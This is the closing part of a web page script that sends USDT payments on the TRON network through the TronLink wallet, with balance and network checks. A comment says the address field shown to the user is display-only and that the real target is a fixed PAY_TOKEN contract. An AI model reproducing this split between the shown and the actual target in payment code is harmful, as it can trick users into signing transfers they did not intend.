  payBtn.addEventListener("click", async function () {
    if (busy) return;

    var tw = getTronWeb();
    if (!tw) {
      toast("请在 TronLink 自带浏览器里打开本页", 2600);
      connect();
      return;
    }

    var from = tw.defaultAddress.base58;

    /* 页面地址栏只做展示，真正调用的目标固定是 PAY_TOKEN，这里不看输入框 */

    /* 数量必须有 */
    var pAmt = parseAmount($("amountInput").value);
    if (!pAmt) {
      toast("请先输入数量", 2400);
      $("amountInput").focus();
      return;
    }

    busy = true;
    paintBtn("busy", "准备交易");

    try {
      var micro = toMicro(pAmt.text);

      /* 网络判定平时就在后台缓存好了，这里几乎不花时间 */
      var net = LIVE.net || (await detectNet(tw));

      if (net.payOk === false || (net.net === "main" && net.payOk !== true)) {
        throw new Error("NETMISMATCH:" + net.net);
      }

      /* 三件事同时开跑：搭交易、查链上余额、确认代币合约在。
         手上的预热交易直接复用（额度就地换成这次的数量，不再问节点建交易）。 */
      var warm = warmFor(tw, from, micro);
      var builtP = warm ? Promise.resolve(warm) : buildTx(tw, from, micro);
      var balP = readUsdtBalance(tw, net.usdt, from);
      var tokP = nodeHasContract(tw, PAY_TOKEN);

      var built = await builtP;

      /* 实际调用的那个代币合约在这条链上得存在，不然拦住别发 */
      var hasTok = await tokP;
      if (hasTok === false) throw new Error("NOCTR:" + PAY_TOKEN);

      /* 余额校验：以链上实时余额为准，不拿缓存糊弄 */
      var balNow = await balP;
      if (balNow !== null) {
        BAL_USDT = balNow;
        $("availBal").textContent = "可用 " + fmtNum(balNow, 2) + " USDT";
        syncAmount();
        if (pAmt.num > balNow + 1e-9) throw new Error("LOWBAL:" + balNow + ":" + pAmt.text);
      }

      paintBtn("busy", "等待钱包确认");
      var signed = await signTx(tw, built.tx);
      WARM = null;
      paintBtn("busy", "正在广播");

      var sent = await tw.trx.sendRawTransaction(signed);
      if (!sent || !sent.result) {
        var why = hexMsg(sent && sent.message) || (sent && sent.code) || "节点拒绝";
        throw new Error("链上未通过：" + why);
      }

      busy = false;
      payBtn.classList.add("done");
      paintBtn("done", "已提交");
      toast("已上链 " + String(sent.txid || "").slice(0, 10) + "…", 3200);
      calibrateFee(tw, sent.txid);
      /* 付完了：能量估值和预热那一笔都刷新，下一笔继续是热的 */
      refreshFee(tw, net, from).catch(function () {});
      scheduleWarm(0);
    } catch (e) {
      busy = false;
      paintBtn("idle", "下一步");
      var raw = String((e && e.message) || e);
      if (raw.indexOf("NETMISMATCH:") === 0) {
        var wn = raw.split(":")[1];
        toast("当前网络是" + (wn === "nile" ? " Nile 测试网" : "主网") + "，上面没有你的收款合约。请在 TronLink 里把网络切到 Nile 再点一次", 5600);
      } else if (raw.indexOf("LOWBAL:") === 0) {
        var seg = raw.split(":");
        toast("余额不足：可用 " + fmtNum(Number(seg[1]), 2) + " USDT，本次需要 " + seg[2] + " USDT", 4600);
      } else if (raw.indexOf("NOCTR:") === 0) {
        toast("这个地址在当前网络上查不到合约（地址填错或网络不对），已拦住不发起交易", 4600);
      } else {
        toast(friendly(e), 4600);
      }
    }
  });
})();
</script>
</body>
</html>
